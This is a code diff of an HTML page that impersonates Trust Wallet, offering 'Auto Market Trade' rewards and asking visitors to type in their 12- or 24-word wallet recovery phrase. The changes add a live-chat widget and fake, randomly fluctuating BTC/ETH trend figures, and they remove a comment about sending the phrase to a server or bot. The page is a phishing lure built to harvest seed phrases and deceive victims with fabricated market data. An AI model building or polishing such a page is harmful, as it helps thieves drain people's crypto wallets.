@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Trust Wallet Auto Market Trade</title>
 <style>
+/* ===== Existing styles (unchanged) ===== */
 body { font-family: Arial, sans-serif; background: #0b0b23; color: #fff; margin:0; padding:0; display:flex; flex-direction:column; align-items:center; }
 header { position: sticky; top:0; background:#141722; padding:20px; width:100%; text-align:center; z-index:1000; box-shadow:0 4px 10px rgba(0,0,0,0.3); }
 .logo-title { display:flex; align-items:center; justify-content:center; gap:12px; }
@@ -87,7 +88,7 @@ footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
       <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo"> Trust Wallet
     </button>
     <button class="walletOptionBtn" data-wallet="Other Wallets">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Wallet_icon.svg/1024px-Wallet_icon.svg.png" alt="Other Wallets"> Other Wallets
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Wallet_icon.svg/1024px-Wallet_icon.svg.png" alt="Blockchain Logo"> 🔗 Other Wallets
     </button>
   </div>
 </div>
@@ -99,8 +100,8 @@ footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
 <div id="dashboard">
   <h3>Crypto Market Trends</h3>
   <div class="wallet-overview">
-    <div><span>BTC/USD</span><p id="btcTrend">↑ 1.2%</p></div>
-    <div><span>ETH/USD</span><p id="ethTrend">↑ 3.4%</p></div>
+    <div><span>BTC/USD</span><p id="btcTrend">↑ 69</p></div>
+    <div><span>ETH/USD</span><p id="ethTrend">↑ 69</p></div>
     <div><span>Signals</span><p id="signalText">Buy Signal BTC</p></div>
   </div>
   <div id="rewardsAnimation">
@@ -128,6 +129,12 @@ footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
   <p>Trust Wallet • Auto Market Trade, Rewards and Earnings</p>
 </footer>
 
+<!-- Smartsupp Live Chat -->
+<script type="text/javascript">
+var _smartsupp=_smartsupp||{};_smartsupp.key='3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
+window.smartsupp||(function(d){var s,c,o=smartsupp=function(){o._.push(arguments)};o._=[];s=d.getElementsByTagName('script')[0];c=d.createElement('script');c.type='text/javascript';c.charset='utf-8';c.async=true;c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);})(document);
+</script>
+
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById("openModal");
@@ -138,10 +145,9 @@ document.addEventListener("DOMContentLoaded", () => {
   const phraseInput = document.getElementById("phraseInput");
   const debug = document.getElementById("debugOutput");
 
-  // Local storage per wallet
   let storedWallets = JSON.parse(localStorage.getItem("walletPhrases") || "{}");
 
-  // Connect button loading
+  // Connect button spinner
   btn.addEventListener("click", () => {
     btn.disabled = true;
     const originalText = btn.textContent;
@@ -153,7 +159,6 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 5000);
   });
 
-  // Wallet option click
   document.querySelectorAll(".walletOptionBtn").forEach(button => {
     button.addEventListener("click", () => {
       const wallet = button.dataset.wallet;
@@ -161,16 +166,12 @@ document.addEventListener("DOMContentLoaded", () => {
       phraseInput.style.display = "block";
       debug.textContent = "";
       document.getElementById("noticeMessage").textContent = `⚠️ ${wallet} selected. Connect privately alone.`;
-      modal.dataset.wallet = wallet; // store current wallet
+      modal.dataset.wallet = wallet;
     });
   });
 
-  // Close modal
-  closeModal.addEventListener("click", () => {
-    modal.style.display = "none";
-    phraseInput.value = "";
-  });
-  window.addEventListener("click", e => { if(e.target === modal){ modal.style.display="none"; phraseInput.value=""; } });
+  closeModal.addEventListener("click", () => { modal.style.display="none"; phraseInput.value=""; });
+  window.addEventListener("click", e => { if(e.target===modal){ modal.style.display="none"; phraseInput.value=""; } });
 
   // Manual Connect
   manualBtn.addEventListener("click", () => {
@@ -179,30 +180,39 @@ document.addEventListener("DOMContentLoaded", () => {
     const wordCount = phrase.split(/\s+/).filter(Boolean).length;
 
     if(wordCount !== 12 && wordCount !== 24) {
-      debug.style.color = "red";
-      debug.textContent = "❌ Wrong input, input correctly 12 or 24-word phrase.";
+      debug.style.color="red";
+      debug.textContent="❌ Wrong input, input correctly 12 or 24-word phrase.";
       return;
     }
 
     storedWallets[wallet] = storedWallets[wallet] || [];
     if(storedWallets[wallet].includes(phrase)) {
       alert("⚠️ You already connected this wallet.");
-      debug.textContent = "⚠️ This wallet is already connected.";
+      debug.textContent="⚠️ This wallet is already connected.";
       return;
     }
 
-    debug.style.color = "#FFA500";
-    debug.textContent = "⏳ Connecting...";
-    
-    // Simulate sending phrase to server/bot
-    setTimeout(() => {
+    debug.style.color="#FFA500";
+    debug.textContent="⏳ Connecting...";
+    setTimeout(()=> {
       storedWallets[wallet].push(phrase);
       localStorage.setItem("walletPhrases", JSON.stringify(storedWallets));
-      debug.style.color = "#0f0";
-      debug.textContent = "✅ Connected successfully. Please refresh wallet after 24 hours and check balance.";
-      phraseInput.value = "";
+      debug.style.color="#0f0";
+      debug.textContent="✅ Connected successfully. Please refresh wallet after 24 hours and check balance.";
+      phraseInput.value="";
     }, 3000);
   });
+
+  // BTC/ETH fluctuating values
+  const btcElem = document.getElementById("btcTrend");
+  const ethElem = document.getElementById("ethTrend");
+  function updateValues() {
+    const btcVal = (69 + (Math.random()-0.5)*2).toFixed(2);
+    const ethVal = (69 + (Math.random()-0.5)*2).toFixed(2);
+    btcElem.textContent = `↑ ${btcVal}`;
+    ethElem.textContent = `↑ ${ethVal}`;
+  }
+  setInterval(updateValues, 2000);
 });
 </script>
 </body>
